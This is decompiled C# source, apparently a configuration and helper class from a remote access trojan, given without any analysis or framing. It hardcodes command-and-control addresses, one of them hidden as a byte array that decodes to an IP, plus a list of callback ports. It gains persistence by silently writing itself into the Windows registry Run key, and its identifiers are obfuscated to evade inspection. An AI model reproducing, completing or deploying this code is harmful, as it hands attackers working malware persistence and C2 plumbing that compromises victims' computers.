using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace irvrmjavhica;

internal static class DAEONIF
{
	public static string irvrmjavhicadyPiath = Application.get_ExecutablePath();

	public static string irvrmjavhicaapapPirth = Application.get_ExecutablePath().ToString();

	public static string irvrmjavhicadifarltP = "130.5.26.108|irvrmjavhica".Split(new char[1] { '|' })[0];

	public static string irvrmjavhicamrnApup = "irvrmjavhica|irvrmjavhica".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 6672, 10443, 3888, 16851, 19184 };

	public static byte[] irvrmjavhicavpdips = new byte[15]
	{
		49, 51, 52, 46, 49, 49, 57, 46, 49, 56,
		49, 46, 49, 52, 50
	};

	public static int irvrmjavhicaport;

	public static string irvrmjavhicapc_ird = "donpta|irvrmjavhica".Split(new char[1] { '|' })[0];

	public static string irvrmjavhicaremvUwer = "iakaourna|irvrmjavhica".Split(new char[1] { '|' })[0];

	public static string irvrmjavhicafilesLwgs = "flrohirda".Split(new char[1] { '|' })[0];

	public static string irvrmjavhicaOdime()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!irvrmjavhica".Split(new char[1] { '!' })[0];
		}
	}

	public static void irvrmjavhicaset_rudn(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|irvrmjavhica".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(irvrmjavhicapc_ird + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(irvrmjavhicapc_ird + app, path);
			}
		}
		catch
		{
		}
	}

	public static string getBDString(byte[] data)
	{
		char[] array = new char[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(data[i]));
		}
		return new string(array);
	}

	public static byte[] getyBYArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string irvrmjavhicaget_mtath()
	{
		return Path.GetDirectoryName(irvrmjavhicaapapPirth) + "\\".ToString();
	}
}
